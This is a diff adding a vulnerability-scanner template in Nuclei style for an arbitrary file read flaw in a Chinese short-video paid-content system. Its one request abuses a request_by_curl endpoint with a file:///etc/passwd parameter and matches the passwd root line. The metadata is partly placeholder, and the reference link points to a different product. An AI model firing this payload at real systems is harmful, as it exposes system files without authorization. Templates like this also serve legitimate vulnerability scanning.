@@ -1,0 +1,22 @@
+id: mdspff-remote-server-lfi
+
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: 某短视频系统视频知识付费系统存在前台任意文件读取漏洞，使系统处于极不安全的状态。。
+  reference:
+    - https://github.com/wy876/POC/blob/main/%E4%B8%89%E6%B1%87%E7%BD%91%E5%85%B3%E7%AE%A1%E7%90%86%E8%BD%AF%E4%BB%B6/%E4%B8%89%E6%B1%87SMG%E7%BD%91%E5%85%B3%E7%AE%A1%E7%90%86%E8%BD%AF%E4%BB%B6SMGSuperAdmin%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E.md
+  tags: tags
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}//index/index/request_by_curl?remote_server=file:///etc/passwd&post_string=1"
+
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "root:.*:0:0:"
+        condition: or
